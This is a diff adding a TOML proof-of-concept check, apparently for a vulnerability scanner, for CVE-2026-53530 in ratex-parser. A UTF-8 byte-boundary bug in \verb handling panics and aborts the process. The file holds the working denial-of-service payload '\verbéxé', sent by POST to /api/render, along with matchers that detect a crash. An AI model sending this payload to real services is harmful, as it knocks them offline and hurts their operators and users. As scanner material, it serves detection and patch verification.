@@ -1,0 +1,46 @@
+[info]
+author = "AVE"
+description = 'ratex-parser 在处理 \verb 命令时使用字节索引而非字符索引切片多字节 UTF-8 分隔符（如 é），导致 panic 并因 panic=abort 设置终止整个进程造成拒绝服务。发送 \verbéxé 的 LaTeX 输入可触发此漏洞。'
+id = "POC-AVE-2026-0409"
+name = "CVE-2026-53530 ratex-parser UTF-8 byte-boundary panic PoC"
+severity = "high"
+tags = ["ave-2026-0409"]
+vuln_id = [
+    "CVE-2026-53530",
+    "GHSA-4hgp-59h5-gvrj",
+    "AVE-2026-0409",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/render"
+protocol = "http"
+
+[poc.requests.body]
+content = '\verbéxé'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/plain; charset=utf-8"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "panicked",
+    "byte index",
+    "not a char boundary",
+]
